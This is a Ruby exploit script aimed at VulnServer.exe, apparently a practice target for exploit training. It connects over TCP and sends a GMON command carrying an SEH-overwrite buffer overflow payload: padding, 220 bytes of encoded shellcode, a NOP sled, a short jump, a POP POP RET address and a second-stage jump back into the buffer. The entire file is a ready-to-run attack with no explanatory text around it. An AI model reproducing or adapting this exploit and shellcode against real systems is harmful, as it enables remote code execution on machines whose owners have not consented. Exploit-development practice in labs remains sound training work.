#! /usr/bin/env ruby
# VulnServer.exe Exploit
# 
# Usage ./vulnserv.rb <IP> <PORT>
#
require 'socket'

# Check arguments
if ARGV.length < 2
  puts "usage #{__FILE__} <target ip> <target port>"
  exit
end

# Create the socket
IP=ARGV[0]
PORT=ARGV[1]

puts "[+] Connecting..."
s = TCPSocket.new(IP, PORT)

# Define command
cmd = "GMON"

# Define payload
payload = " /.:/"
payload += "\x90" * 3167         # padding        
payload +=                       # 3rd stage shellcode (220 bytes)
  "\xbd\xbc\xdd\xdf\xda\xd9\xc3\xd9\x74\x24\xf4\x5b\x33\xc9" +
  "\xb1\x31\x31\x6b\x13\x03\x6b\x13\x83\xeb\x40\x3f\x2a\x26" +
  "\x50\x42\xd5\xd7\xa0\x23\x5f\x32\x91\x63\x3b\x36\x81\x53" +
  "\x4f\x1a\x2d\x1f\x1d\x8f\xa6\x6d\x8a\xa0\x0f\xdb\xec\x8f" +
  "\x90\x70\xcc\x8e\x12\x8b\x01\x71\x2b\x44\x54\x70\x6c\xb9" +
  "\x95\x20\x25\xb5\x08\xd5\x42\x83\x90\x5e\x18\x05\x91\x83" +
  "\xe8\x24\xb0\x15\x63\x7f\x12\x97\xa0\x0b\x1b\x8f\xa5\x36" +
  "\xd5\x24\x1d\xcc\xe4\xec\x6c\x2d\x4a\xd1\x41\xdc\x92\x15" +
  "\x65\x3f\xe1\x6f\x96\xc2\xf2\xab\xe5\x18\x76\x28\x4d\xea" +
  "\x20\x94\x6c\x3f\xb6\x5f\x62\xf4\xbc\x38\x66\x0b\x10\x33" +
  "\x92\x80\x97\x94\x13\xd2\xb3\x30\x78\x80\xda\x61\x24\x67" +
  "\xe2\x72\x87\xd8\x46\xf8\x25\x0c\xfb\xa3\x23\xd3\x89\xd9" +
  "\x01\xd3\x91\xe1\x35\xbc\xa0\x6a\xda\xbb\x3c\xb9\x9f\x34" +
  "\x77\xe0\x89\xdc\xde\x70\x88\x80\xe0\xae\xce\xbc\x62\x5b" +
  "\xae\x3a\x7a\x2e\xab\x07\x3c\xc2\xc1\x18\xa9\xe4\x76\x18" +
  "\xf8\x86\x19\x8a\x60\x67\xbc\x2a\x02\x77"
payload += "\x90" * 128          # NOP sled               
payload += "\xeb\x0f\x90\x90"    # 1st Stage: JMP 0F NOP NOP
payload += "\xb3\x11\x50\x62"    # SEH overwrite POP POP RET
payload += "\x59\xfe\xcd\xfe\xcd\xfe\xcd\xff\xe1\xe8\xf2\xff\xff\xff" # 2nd stage: JMP to start of payload
payload += "\x90" * (5000 - payload.length)

# Send the payload
begin
  s.gets
  puts "[+] Sending payload.."
  s.puts(cmd + payload)
  s.gets
  puts "[-] Failed to crash the target"
  s.close
rescue Errno::ECONNRESET
  puts "[+] Crash!!"
end

